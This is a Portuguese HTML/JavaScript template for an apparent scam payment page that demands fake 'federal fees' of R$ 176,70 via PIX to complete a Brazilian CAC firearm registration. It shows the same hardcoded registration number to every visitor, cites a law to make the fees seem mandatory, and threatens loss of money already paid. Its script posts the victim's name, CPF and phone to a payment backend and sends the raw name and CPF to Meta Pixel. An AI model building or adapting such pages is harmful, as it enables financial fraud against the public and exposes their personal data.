{% extends "layout.html" %}

{% block content %}
<style>
body {
    background-color: #fff !important;
}

@keyframes blink-animation {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
}

.alert-icon-blink {
    animation: blink-animation 1.2s infinite;
}
</style>
<main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
    <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg border border-gray-200">
        <!-- Formulário CAC -->
        <div class="mb-6" style="text-align: left;">
                <div style="text-align: center; margin-bottom: 16px;">
                    <i class="fas fa-exclamation-triangle alert-icon-blink" style="color: #dc2626; font-size: 34px!important; margin-bottom: 4px;"></i>
                    <h2 class="font-bold mb-4" style="font-size: 18px; color: #dc2626;">TAXAS FEDERAIS PENDENTES</h2>
                </div>
                
                <div style="margin-bottom: 16px;">
                    <label style="display: none; font-weight: 600; color: #374151; font-size: 15px;">REQUERENTE:</label>
                    <p style="display: none; margin: 4px 0; font-size: 14px;" id="user-name">Carregando...</p>
                </div>
                
                <div style="margin-bottom: 16px;">
                    <label style="display: none; font-weight: 600; color: #374151; font-size: 15px;">CPF:</label>
                    <p style="display: none; margin: 4px 0; font-size: 14px;" id="user-cpf">Carregando...</p>
                </div>
                
                <div style="margin-bottom: 16px;">
                    <label style="font-weight: 600; color: #374151; font-size: 15px;">Nº CR:</label>
                    <p style="margin: 4px 0; font-size: 14px; color: #059669;" id="cr-number">000.000.000-00</p>
                </div>
                
                <div style="margin-bottom: 16px;">
                    <label style="font-weight: 600; color: #374151; font-size: 14px;">PARA FINALIZAR SEU REGISTRO CAC É OBRIGATÓRIO O PAGAMENTO DAS TAXAS FEDERAIS:</label>
                    <br>
                    <ul style="margin: 4px 0; font-size: 15px; padding-left: 16px;">
                        <li><strong>Taxa da Guia de Tráfego (GT)</strong> - R$ 98,40<br>
                            <span style="color: #6b7280; font-size: 15px;">Necessária para transportar armas entre residência, clube de tiro e competições</span>
                        </li>
                        <li style="margin-top: 8px;"><strong>Taxa de Aquisição de armas e munições</strong> - R$ 78,30<br>
                            <span style="color: #6b7280; font-size: 15px;">Autorização para compra de armamento e munições</span>
                        </li>
                    </ul>
                </div>
                
                <div style="margin-bottom: 16px;">
                    <label style="font-weight: 600; color: #374151; font-size: 12px;">VALOR TOTAL:</label>
                    <p style="margin: 4px 0; font-size: 15px; font-weight: bold; color: #dc2626;">R$ 176,70</p>
                </div>
                
                <div style="background-color: #fef2f2; border: 1px solid #fecaca; padding: 15px; border-radius: 2px;">
                    <label style="font-weight: 600; color: #dc2626; font-size: 15px;">IMPORTANTE:</label>
                    <p style="margin: 4px 0; font-size: 15px; color: #dc2626;">
                        Essas são as últimas Taxas cobradas para a Emissão do seu CR CAC.
                        <strong>Sem o pagamento das taxas federais, o Certificado CAC não será concluído.</strong>
                        <br><br>
                        Conforme estabelecido na Lei 14.892/2025, todas as Taxas são obrigatórias por lei. Em caso de não pagamento, valores já pagos não serão reembolsados. 
                        <strong>O não pagamento dessas taxas resultará no cancelamento do CR e perda definitiva do valor de R$ 19,90 já pago na Taxa de Emissão.</strong>
                    </p>
                </div>
            </div>
        </div>

        <!-- Status -->
        <div id="payment-status" class="mb-6">
            <div id="loading-payment" class="text-center">
                <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-green-600 mb-2"></div>
                <p class="text-gray-600">Processando pagamento...</p>
            </div>
        </div>

        <!-- QR Code PIX -->
        <div id="payment-details" class="hidden">
            <div class="text-center mb-6">
                <div id="qr-code-container" class="mb-4 flex justify-center items-center">
                    <img id="qr-code" src="" alt="QR Code PIX" class="border-2 border-gray-300 rounded bg-white p-2" style="width: 180px; height: 180px;">
                </div>
                <p id="qr-status" class="text-sm text-gray-600 mb-4">Gerando QR Code...</p>
            </div>

            <!-- Código PIX -->
            <div style="margin-bottom: 24px;">
                <label style="display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px;">Código PIX (Copia e Cola):</label>
                <textarea id="pix-code" readonly rows="2"
                       style="width: 100%; padding: 8px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 14px; background-color: #f9fafb; resize: none; font-family: monospace; height: 50px;" 
                       placeholder="Código será gerado..."></textarea>
                <div style="text-align: center; margin-top: 12px;">
                    <button onclick="copyPixCode()" 
                            style="background: linear-gradient(145deg, #059669, #047857); color: white; padding: 20px; border-radius: 8px; border: none; cursor: pointer; font-weight: 700; font-size: 18px; transition: all 0.3s; width: 100%; box-shadow: 0 8px 16px rgba(5,150,105,0.3), 0 4px 8px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.2); transform: translateY(-2px); text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"
                            onmouseover="this.style.background='linear-gradient(145deg, #047857, #065f46)'; this.style.boxShadow='0 12px 24px rgba(5,150,105,0.4), 0 6px 12px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.3)'; this.style.transform='translateY(-3px)';" 
                            onmouseout="this.style.background='linear-gradient(145deg, #059669, #047857)'; this.style.boxShadow='0 8px 16px rgba(5,150,105,0.3), 0 4px 8px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.2)'; this.style.transform='translateY(-2px)';">
                        <i class="fas fa-copy" style="margin-right: 10px;"></i>
                        Copiar Código PIX
                    </button>
                </div>
            </div>

            <!-- Instruções -->
            <div style="background-color: rgba(32, 108, 79, 0.1); border-left: 4px solid #206C4F; padding: 16px; margin-bottom: 16px; border-radius: 2px;">
                <div style="display: flex; align-items: flex-start;">
                    <div style="flex-shrink: 0; margin-right: 12px; margin-top: 2px;">
                        <i class="fas fa-check-circle" style="color: #206C4F; font-size: 16px;"></i>
                    </div>
                    <div>
                        <p style="font-size: 14px; color: #206C4F; margin: 0;">
                            <strong>Próximos Passos:</strong><br>
                            Após o pagamento das taxas no valor de <strong>R$ 176,70</strong>, seu cadastro CAC será finalizado e você poderá agendar o exame de tiro obrigatório para conclusão do processo.
                        </p>
                    </div>
                </div>
            </div>

            <!-- Status do Pagamento -->
            <div id="payment-check" class="text-center">
                <button onclick="checkPaymentStatus()" 
                        class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">
                    <i class="fas fa-sync-alt mr-2"></i>
                    Verificar Pagamento
                </button>
            </div>
        </div>

        <!-- Erro -->
        <div id="payment-error" class="hidden">
            <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-4">
                <div class="flex">
                    <div class="flex-shrink-0">
                        <i class="fas fa-exclamation-triangle text-red-400"></i>
                    </div>
                    <div class="ml-3">
                        <p class="text-sm text-red-700" id="error-message">Erro ao processar pagamento</p>
                    </div>
                </div>
            </div>
            <div class="text-center">
                <button onclick="retryPayment()" 
                        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
                    Tentar Novamente
                </button>
            </div>
        </div>
    </div>
</main>

<script>
let currentTransactionId = null;

// Função para processar pagamento ao carregar a página
document.addEventListener('DOMContentLoaded', function() {
    initializePayment();
});

function initializePayment() {
    // Preencher número CR fixo
    document.getElementById('cr-number').textContent = '678923/2025 - 2ª RM';

    // Buscar dados do usuário da sessão e processar pagamento
    fetch('/get_user_data')
        .then(response => response.json())
        .then(data => {
            console.log('Dados do usuário da API:', data);
            document.getElementById('user-name').textContent = (data.full_name || 'USUÁRIO NÃO IDENTIFICADO').toUpperCase();
            document.getElementById('user-cpf').textContent = (data.cpf || '000.000.000-00').toUpperCase();
            
            // Verificar se há dados no localStorage também
            const localData = {
                nome: localStorage.getItem('full_name') || localStorage.getItem('nome') || '',
                cpf: localStorage.getItem('cpf') || '',
                telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || ''
            };
            
            console.log('Dados do localStorage:', localData);
            
            // Usar dados da sessão ou localStorage (priorizar sessão)
            const userData = {
                nome: data.full_name || localData.nome || 'Usuário Teste',
                cpf: data.cpf || localData.cpf || '000.000.000-00',
                telefone: data.phone || localData.telefone || '11999999999'
            };
            
            console.log('Dados finais para pagamento taxa:', userData);
            
            // Processar pagamento com dados reais (valor das taxas)
            return fetch('/process_taxa_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userData)
            });
        })
        .catch(error => {
            console.error('Erro ao buscar dados do usuário:', error);
            document.getElementById('user-name').textContent = 'USUÁRIO NÃO IDENTIFICADO';
            document.getElementById('user-cpf').textContent = '000.000.000-00';
            
            // Em caso de erro, tentar com dados do localStorage
            const fallbackData = {
                nome: localStorage.getItem('full_name') || localStorage.getItem('nome') || 'Usuário Teste',
                cpf: localStorage.getItem('cpf') || '000.000.000-00',
                telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || '11999999999'
            };
            
            return fetch('/process_taxa_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(fallbackData)
            });
        })
        .then(response => response.json())
    .then(data => {
        console.log('Resposta do pagamento taxa:', data);
        
        if (data.success) {
            showPaymentDetails(data.payment_data);
        } else {
            showError(data.error || 'Erro ao processar pagamento');
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        showError('Erro de conexão. Tente novamente.');
    });
}

function showPaymentDetails(paymentData) {
    document.getElementById('loading-payment').style.display = 'none';
    document.getElementById('payment-details').classList.remove('hidden');
    
    console.log('PaymentData recebido:', paymentData);
    
    // Configurar QR Code
    const qrCodeElement = document.getElementById('qr-code');
    const qrStatusElement = document.getElementById('qr-status');
    
    if (paymentData.qr_code && paymentData.qr_code.trim() !== '') {
        qrCodeElement.src = 'data:image/png;base64,' + paymentData.qr_code;
        qrStatusElement.textContent = 'Escaneie o QR Code com seu banco';
        qrCodeElement.style.display = 'block';
    } else {
        // Gerar QR Code usando o código PIX se não tiver imagem
        if (paymentData.pix_code) {
            generateQRCode(paymentData.pix_code);
        } else {
            qrStatusElement.textContent = 'QR Code não disponível';
            qrCodeElement.style.display = 'none';
        }
    }
    
    // Configurar código PIX
    if (paymentData.pix_code) {
        document.getElementById('pix-code').value = paymentData.pix_code;
        document.getElementById('pix-code').style.height = 'auto';
    }
    
    // Armazenar ID da transação
    currentTransactionId = paymentData.transaction_id;
}

function generateQRCode(pixCode) {
    // Usar uma API de QR Code gratuita
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixCode)}`;
    const qrCodeElement = document.getElementById('qr-code');
    const qrStatusElement = document.getElementById('qr-status');
    
    qrCodeElement.src = qrUrl;
    qrCodeElement.style.display = 'block';
    qrStatusElement.textContent = 'Escaneie o QR Code com seu banco';
}

function showError(message) {
    document.getElementById('loading-payment').style.display = 'none';
    document.getElementById('payment-error').classList.remove('hidden');
    document.getElementById('error-message').textContent = message;
}

function copyPixCode() {
    const pixCodeTextarea = document.getElementById('pix-code');
    pixCodeTextarea.select();
    pixCodeTextarea.setSelectionRange(0, 99999); // Para dispositivos móveis
    
    try {
        document.execCommand('copy');
        // Feedback visual
        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
        button.classList.add('bg-green-800');
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.classList.remove('bg-green-800');
        }, 2000);
    } catch (err) {
        console.error('Erro ao copiar código PIX:', err);
        // Fallback para navegadores modernos
        navigator.clipboard.writeText(pixCodeTextarea.value).then(() => {
            const button = event.target.closest('button');
            const originalText = button.innerHTML;
            button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
            button.classList.add('bg-green-800');
            
            setTimeout(() => {
                button.innerHTML = originalText;
                button.classList.remove('bg-green-800');
            }, 2000);
        });
    }
}

function checkPaymentStatus() {
    if (!currentTransactionId) {
        alert('ID da transação não encontrado');
        return;
    }
    
    const button = event.target;
    const originalText = button.innerHTML;
    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
    button.disabled = true;
    
    fetch(`/check_payment_status/${currentTransactionId}`)
    .then(response => response.json())
    .then(data => {
        console.log('Status do pagamento:', data);
        
        if (data.success && data.status === 'PAID') {
            // Pagamento aprovado, redirecionar
            window.location.href = '/aprovado';
        } else {
            alert('Pagamento ainda pendente. Verifique novamente em alguns instantes.');
        }
    })
    .catch(error => {
        console.error('Erro ao verificar status:', error);
        alert('Erro ao verificar status do pagamento');
    })
    .finally(() => {
        button.innerHTML = originalText;
        button.disabled = false;
    });
}

function retryPayment() {
    document.getElementById('payment-error').classList.add('hidden');
    document.getElementById('loading-payment').style.display = 'block';
    initializePayment();
}

// Função para obter parâmetros UTM da localStorage
function getStoredUTMParams() {
    const utmParams = {};
    
    // Parâmetros UTM padrão
    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'].forEach(param => {
        const value = localStorage.getItem(param);
        if (value) {
            utmParams[param] = value;
        }
    });
    
    // Parâmetros específicos da Meta
    ['fbclid', 'fbc', 'fbp'].forEach(param => {
        const value = localStorage.getItem(param);
        if (value) {
            utmParams[param] = value;
        }
    });
    
    return utmParams;
}

// Função para hash SHA256 (para dados sensíveis)
async function hashData(data) {
    if (!data) return null;
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(data.toLowerCase().trim());
    const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Enviar evento de Purchase para Meta Pixel quando chegar na página /taxa
async function sendTaxaPurchaseEvent() {
    try {
        // Proteção múltipla contra duplicação de AddToCart
        const addToCartAlreadySent = localStorage.getItem('meta_addtocart_sent');
        const sessionAddToCartSent = sessionStorage.getItem('meta_addtocart_sent');
        const cookieCheck = document.cookie.includes('meta_addtocart_sent=true');
        
        if (addToCartAlreadySent || sessionAddToCartSent || cookieCheck) {
            console.log('Evento AddToCart já foi enviado (localStorage, sessionStorage ou cookie), evitando duplicação');
            return;
        }
        
        // Verificar se já enviamos AddToCart nos últimos 2 minutos para este usuário
        const lastAddToCartTime = localStorage.getItem('last_addtocart_time');
        const currentTime = Date.now();
        if (lastAddToCartTime && (currentTime - parseInt(lastAddToCartTime)) < 120000) { // 2 minutos
            console.log('AddToCart enviado recentemente (menos de 2 min), evitando spam');
            return;
        }
        
        // Se fbq não está disponível, sair
        if (typeof fbq === 'undefined') {
            console.log('Meta Pixel não disponível na página /taxa');
            return;
        }
        
        // Obter dados do usuário da página
        const userData = {
            nome: document.getElementById('user-name').textContent || localStorage.getItem('full_name') || '',
            cpf: document.getElementById('user-cpf').textContent || localStorage.getItem('cpf') || '',
            telefone: localStorage.getItem('phone') || localStorage.getItem('telefone') || ''
        };
        
        // Obter parâmetros UTM
        const utmParams = getStoredUTMParams();
        
        // Preparar dados para o evento
        const eventData = {
            value: 19.90,
            currency: 'BRL',
            content_type: 'product',
            content_name: 'Taxa de Emissão CAC - Primeira Etapa Concluída',
            content_ids: ['cac-taxa-emissao'],
            num_items: 1,
            transaction_id: 'cac-emissao-' + Date.now(),
            // Adicionar dados UTM como custom parameters
            utm_source: utmParams.utm_source || '',
            utm_medium: utmParams.utm_medium || '',
            utm_campaign: utmParams.utm_campaign || '',
            utm_content: utmParams.utm_content || '',
            utm_term: utmParams.utm_term || ''
        };
        
        // Hash dados sensíveis se disponíveis
        if (userData.nome && userData.nome !== 'USUÁRIO NÃO IDENTIFICADO') {
            // Extrair email se existir (assumindo formato nome + @domain)
            const emailGuess = userData.nome.toLowerCase().replace(/\s+/g, '') + '@email.com';
            eventData.em = await hashData(emailGuess);
        }
        
        if (userData.telefone) {
            // Limpar telefone para hash
            const cleanPhone = userData.telefone.replace(/[^\d]/g, '');
            if (cleanPhone.length >= 10) {
                eventData.ph = await hashData('+55' + cleanPhone);
            }
        }
        
        // Adicionar parâmetros específicos da Meta se disponíveis
        if (utmParams.fbc) {
            eventData.fbc = utmParams.fbc;
        }
        if (utmParams.fbp) {
            eventData.fbp = utmParams.fbp;
        }
        
        // MUDAR Purchase para AddToCart para evitar duplicação
        // O evento Purchase final será enviado apenas na página /aprovado
        fbq('track', 'AddToCart', eventData);
        
        // Enviar também como evento customizado para garantir
        fbq('trackCustom', 'CAC_FirstPayment_Success', {
            value: 19.90,
            currency: 'BRL',
            step: 'taxa_emissao_concluida',
            product: 'Taxa de Emissão CAC',
            user_name: userData.nome,
            user_cpf: userData.cpf,
            utm_data: utmParams
        });
        
        // Marcar que AddToCart foi enviado em múltiplos locais para evitar duplicação
        localStorage.setItem('meta_addtocart_sent', 'true');
        sessionStorage.setItem('meta_addtocart_sent', 'true');
        localStorage.setItem('last_addtocart_time', currentTime.toString());
        
        // Criar cookie de segurança que expira em 2 horas
        document.cookie = 'meta_addtocart_sent=true; max-age=7200; path=/';
        
        console.log('Evento AddToCart enviado para Meta Pixel na página /taxa (evitando duplicação):', eventData);
        
    } catch (error) {
        console.error('Erro ao enviar evento para Meta na página /taxa:', error);
        
        // Fallback para evento básico
        if (typeof fbq !== 'undefined') {
            // Marcar que AddToCart foi enviado mesmo no fallback
            localStorage.setItem('meta_addtocart_sent', 'true');
            sessionStorage.setItem('meta_addtocart_sent', 'true');
            localStorage.setItem('last_addtocart_time', Date.now().toString());
            document.cookie = 'meta_addtocart_sent=true; max-age=7200; path=/';
            
            fbq('track', 'AddToCart', {
                value: 19.90,
                currency: 'BRL',
                content_type: 'product',
                content_name: 'Taxa de Emissão CAC',
                content_ids: ['cac-taxa-emissao']
            });
        }
    }
}

// Executar o tracking quando a página carregar
setTimeout(() => {
    sendTaxaPurchaseEvent();
}, 2000); // Aguardar 2 segundos para garantir que o pixel Meta foi carregado

// Função para resetar as flags de AddToCart (se necessário reiniciar processo)
function resetAddToCartFlags() {
    localStorage.removeItem('meta_addtocart_sent');
    sessionStorage.removeItem('meta_addtocart_sent');
    localStorage.removeItem('last_addtocart_time');
    document.cookie = 'meta_addtocart_sent=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/';
    console.log('Flags de AddToCart resetadas na página /taxa');
}
</script>

{% endblock %}